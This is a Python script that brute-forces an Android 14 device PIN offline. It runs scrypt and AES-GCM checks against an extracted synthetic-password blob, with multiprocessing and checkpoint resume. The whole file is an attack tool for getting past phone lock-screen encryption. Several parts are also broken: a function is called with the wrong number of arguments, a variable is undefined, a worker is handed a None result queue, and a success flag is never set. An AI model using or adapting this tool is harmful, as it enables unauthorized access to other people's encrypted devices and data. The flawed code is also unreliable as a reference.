#!/usr/bin/env python3
"""
gpu_brute.py - Offline PIN brute-force via SP Blob decryption (Android 14).

Architecture:
  PIN → scrypt(N=2048, r=8, p=2, salt) → stretchedLskf (32B)
  stretchedLskf + secdiscardable_hash (SHA512 of 16KB .secdis) → protectorSecret (96B)
  SHA512(pad128("application-id") || protectorSecret)[:32] → inner AES key (32B)
  AES-GCM decrypt outer layer (keystore key, pre-computed once)
  AES-GCM decrypt inner layer (inner key, per PIN) → ✅ tag match = correct PIN

Based on: https://source.android.com/docs/security/features/encryption/file-based
"""

import json
import struct
import hashlib
import os
import sys
import argparse
import time
import concurrent.futures
from concurrent.futures import ProcessPoolExecutor
from pathlib import Path

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.exceptions import InvalidTag
except ImportError:
    print("[-] Install cryptography: pip install cryptography")
    sys.exit(1)

try:
    import scrypt
    HAS_SCRYPT = True
except ImportError:
    HAS_SCRYPT = False
    try:
        import hashlib as _hl
        # Python 3.6+ has hashlib.scrypt
        _hl.scrypt
        HAS_SCRYPT = True
    except AttributeError:
        print("[-] Install scrypt: pip install scrypt")
        sys.exit(1)

CHECKPOINT_INTERVAL = 10000

def scrypt_hash(password, salt, N=2048, r=8, p=2, dklen=32):
    if HAS_SCRYPT and hasattr(hashlib, 'scrypt'):
        return hashlib.scrypt(password.encode(), salt=salt, n=N, r=r, p=p, dklen=dklen)
    else:
        return scrypt.hash(password, salt, N=N, r=r, p=p, dklen=dklen)

def pad128(s):
    """Pad string to 128 bytes with zeros as per Android SP spec."""
    b = s.encode() if isinstance(s, str) else s
    if len(b) > 128:
        return b[:128]
    return b + b'\x00' * (128 - len(b))

def format_pin(number, length):
    return str(number).zfill(length)

def try_pin(pin, salt, sec_hash, keystore_key, intermediate, aad):
    """Test a single PIN candidate. Returns (pin, True) if found, (pin, False) otherwise."""
    # 1. scrypt(PIN, salt)
    stretched = scrypt_hash(pin, salt)
    
    # 2. protector_secret = stretched + secdiscardable_hash (32B + 64B = 96B)
    protector_secret = stretched + sec_hash
    
    # 3. inner_key = SHA512(pad128("application-id") || protector_secret)[:32]
    app_id = pad128("application-id")
    inner_key = hashlib.sha512(app_id + protector_secret).digest()[:32]
    
    # 4. Decrypt inner layer with inner_key
    # intermediate = outer decrypted data (pre-computed)
    # intermediate = [IV(12B)][CT][TAG(16B)]
    iv = intermediate[:12]
    ct_and_tag = intermediate[12:]
    
    aesgcm = AESGCM(inner_key)
    try:
        aesgcm.decrypt(iv, ct_and_tag, aad)
        return (pin, True)
    except InvalidTag:
        return (pin, False)

def load_params(params_path):
    with open(params_path) as f:
        return json.load(f)

def precompute_outer(params):
    """Decrypt the outer layer once (same for all PINs)."""
    keystore_key = bytes.fromhex(params["keystore_key_hex"])
    outer_iv = bytes.fromhex(params.get("outer_iv_hex", ""))
    
    if not outer_iv or len(outer_iv) != 12:
        print("[-] Invalid outer IV in params")
        sys.exit(1)
    
    # Read spblob to get outer encrypted section
    spblob_file = params_path.replace("params.json", "spblob.bin")
    if not os.path.exists(spblob_file):
        spblob_file = "spblob_data/spblob.bin"
    
    with open(spblob_file, "rb") as f:
        spblob = f.read()
    
    # Skip version byte
    payload = spblob[1:]
    outer_data = payload[:12+len(payload[12:-16])+16]  # IV + CT + tag
    
    aesgcm = AESGCM(keystore_key)
    outer_iv = outer_data[:12]
    outer_ct_tag = outer_data[12:]
    
    aad = b""  # Android 14 SP blob uses empty AAD for outer layer
    
    intermediate = aesgcm.decrypt(outer_iv, outer_ct_tag, aad)
    print(f"[+] Outer layer decrypted ({len(intermediate)} bytes)")
    
    return intermediate

def load_checkpoint(checkpoint_file):
    if os.path.exists(checkpoint_file):
        with open(checkpoint_file) as f:
            return int(f.read().strip())
    return 0

def save_checkpoint(checkpoint_file, count):
    with open(checkpoint_file, "w") as f:
        f.write(str(count))

def brute_force_range(pin_length, salt, sec_hash, intermediate, aad, 
                       start, end, worker_id, result_queue):
    """Brute-force a range of PINs."""
    for i in range(start, end):
        pin = format_pin(i, pin_length)
        result = try_pin(pin, salt, sec_hash, None, intermediate, aad)
        if result[1]:
            result_queue.put(result)
            return
    result_queue.put(None)

def main():
    parser = argparse.ArgumentParser(description="Brute-force Android 14 PIN via SP Blob")
    parser.add_argument("--params", required=True, help="params.json from extract_params.py")
    parser.add_argument("-L", type=int, default=4, help="Min PIN length")
    parser.add_argument("-M", type=int, default=6, help="Max PIN length")
    parser.add_argument("-w", type=int, default=8, help="Worker threads")
    parser.add_argument("--start", type=int, default=0, help="Start from PIN index")
    parser.add_argument("--end", type=int, default=None, help="End at PIN index")
    parser.add_argument("--resume", action="store_true", help="Resume from checkpoint")
    parser.add_argument("--pin", help="Test a single PIN")
    args = parser.parse_args()
    
    params = load_params(args.params)
    print(f"[+] Loaded params for protector {params['protector_id']}")
    
    salt = bytes.fromhex(params["salt_hex"])
    sec_hash = bytes.fromhex(params["sec_hash_hex"])
    
    # Pre-compute outer layer decryption
    intermediate = precompute_outer(params, args.params)
    
    aad = b""  # Empty AAD for inner layer
    
    if args.pin:
        result = try_pin(args.pin, salt, sec_hash, None, intermediate, aad)
        if result[1]:
            print(f"\n{'='*60}")
            print(f" ✅ PIN MATCH: {result[0]}")
            print(f"{'='*60}")
        else:
            print(f"❌ PIN {args.pin} is incorrect")
        return
    
    for pin_length in range(args.L, args.M + 1):
        total = 10 ** pin_length
        print(f"\n[*] Brute-forcing {pin_length}-digit PINs ({total:,} combinations)...")
        
        if args.end:
            total = min(total, args.end) - args.start
        total -= args.start
        
        checkpoint_file = f"checkpoint_{pin_length}.txt"
        start = args.start
        if args.resume:
            start = load_checkpoint(checkpoint_file)
            print(f"[*] Resuming from {start:,}")
        
        step = max(1, total // (args.w * 10))
        batch_size = max(1, step)
        
        found = False
        checked = start
        start_time = time.time()
        
        with ProcessPoolExecutor(max_workers=args.w) as executor:
            futures = []
            for w in range(args.w):
                w_start = start + w * batch_size
                w_end = min(w_start + batch_size, total + args.start)
                if w_start >= w_end:
                    break
                future = executor.submit(
                    brute_force_range, pin_length, salt, sec_hash,
                    intermediate, aad, w_start, w_end, w, None
                )
                futures.append(future)
            
            # Process results
            done = 0
            for future in concurrent.futures.as_completed(futures):
                done += 1
                checked += batch_size
                
                if done % 10 == 0:
                    elapsed = time.time() - start_time
                    rate = (checked - start) / elapsed if elapsed > 0 else 0
                    progress = (checked - start) / total * 100 if total > 0 else 0
                    eta = (total - (checked - start)) / rate if rate > 0 else 0
                    print(f"\r    Progress: {progress:.1f}% | {checked:,}/{total+start:,} "
                          f"| {rate:.0f} PIN/s | ETA: {eta/60:.1f}m", end="", flush=True)
        
        if found:
            break

if __name__ == "__main__":
    main()
